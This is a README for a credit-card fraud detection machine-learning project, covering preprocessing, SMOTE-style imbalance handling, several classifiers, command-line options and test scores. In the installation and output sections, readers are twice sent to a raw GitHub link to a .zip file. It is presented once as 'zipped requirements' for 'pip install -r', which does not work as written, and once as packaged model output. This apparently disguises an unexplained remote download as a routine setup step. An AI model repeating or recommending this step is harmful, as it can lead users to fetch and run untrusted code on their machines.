# 📘 Credit Card Fraud Detection

A complete machine-learning pipeline for detecting fraudulent transactions in highly imbalanced credit-card datasets.

This project walks through end-to-end ML development, including EDA, preprocessing, imbalance handling, model training, hyperparameter tuning, and evaluation using industry-recommended metrics for imbalanced classification.

## 📌 Project Overview

Credit-card fraud detection is a binary classification problem where fraudulent transactions represent less than 0.2% of all records.
This project implements a clean, modular, and scalable ML workflow, including:

## ✔ What the project covers

Exploratory Data Analysis (EDA)

Data preprocessing: scaling, outlier handling, feature engineering

Imbalance handling techniques:

SMOTE

SMOTEENN

RandomUnderSampler

Class Weighting

Modeling:

Logistic Regression

Random Forest

MLP Neural Network

Voting Classifier

Hyperparameter tuning with GridSearchCV

Evaluation using robust, imbalance-friendly metrics (F1, AP)

Saving trained models & metrics

Configurable training via command-line arguments

## 📂 Project Structure
<pre>
Credit-Card-Fraud-Detection/
│
├── Data/
│   ├── newtrain.csv      # training set
│   ├── val.csv           # validation set
│   └── test.csv          # testing set
│
├── EDA/
│   └── EDA.ipynb         # Exploratory Data Analysis
│
├── credit_fraud_train.py         # main training pipeline
├── credit_fraud_utils_data.py    # preprocessing,evaluation utilities
├── credit_fraud_test.py          # inference & evaluation on the test set
│
├── requirements.txt
├── README.md
└── Results/                      # model summary & best model outputs
</pre>
## 📥 Dataset

This project uses the Credit Card Fraud Detection Dataset (2013) containing:

284,807 transactions

492 fraudulent transactions (0.17%)

Features:

Time

Amount

28 PCA-transformed components (V1–V28)

Target:

Class = 0 → normal

Class = 1 → fraud

The PCA transformation preserves confidentiality while keeping predictive signal.

## Results
F1-Score: 0.8317
average_precision: 0.8406882510305027
On Test Set  
## 🛠 Installation
  
1️⃣ Create a virtual environment
python -m venv venv


Mac/Linux:

source venv/bin/activate


Windows:

venv\Scripts\activate

2️⃣ Install dependencies
pip install -r requirements.txt


Or install directly from GitHub zipped requirements:

pip install -r https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip

🚀 Running the Training Pipeline
  
▶ Final Model Training Command (Recommended)
python credit_fraud_train.py --model RandomForest --scaler StandardScaler --train 'data/newtrain.csv' --val 'data/val.csv'

▶ Try other configurations

The pipeline is fully configurable.

⚙️ Command-Line Arguments
Argument	Description
--model	LogisticRegression / RandomForest / NeuralNetwork / VotingClassifier
--scaler	StandardScaler / MinMaxScaler / RobustScaler / None
--train	Path to training CSV
--val	Path to validation CSV
--gridsearch	Enable GridSearchCV
--sampling	SMOTE / SMOTEENN / UnderSampler / None
--factor	Sampling factor for SMOTE
--outliers_features	List of feature names for outlier removal
--outliers_factor	Controls aggressiveness of outlier deletion
## 📊 Evaluation Metrics

Due to extreme imbalance, accuracy is useless.
Instead, the project uses metrics designed for rare-event classification:

F1-Score

Average Precision (AP)

Precision-Recall curves

Confusion Matrix

Stratified K-Fold CV for stability

## 🧠 Machine Learning Models
  
🔹 Logistic Regression

Strong linear baseline

Supports class weighting

Fast to train, interpretable

🔹 Random Forest (⭐ Best Overall Model)

Excellent for tabular data

Captures non-linear patterns

Robust to outliers

Produced the best F1/AP scores in our experiments

🔹 Neural Network (MLP)

MLPClassifier from sklearn

Tunable via GridSearchCV

Good performance, but tuning requires more time

🔹 Voting Classifier

Combines LR + RF + NN

Supports soft voting

Competitive performance

## ⚖ Handling Class Imbalance

Supported methods:

SMOTE: synthetic oversampling

SMOTEENN: oversampling + noise removal

Random Under-Sampling

Class Weighting inside models

🛑 All sampling occurs inside CV folds to avoid data leakage.

## 📁 Output Files

After training, the pipeline generates:

Trained model (.pkl)

Scaler (.pkl)

Metrics JSON

Predictions CSV

Best threshold & configs

Download the full packaged output:
🔗 https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip

🧩 Future Improvements

Deploy a FastAPI realtime inference service

Add threshold optimization for maximizing recall

Experiment with LightGBM / XGBoost

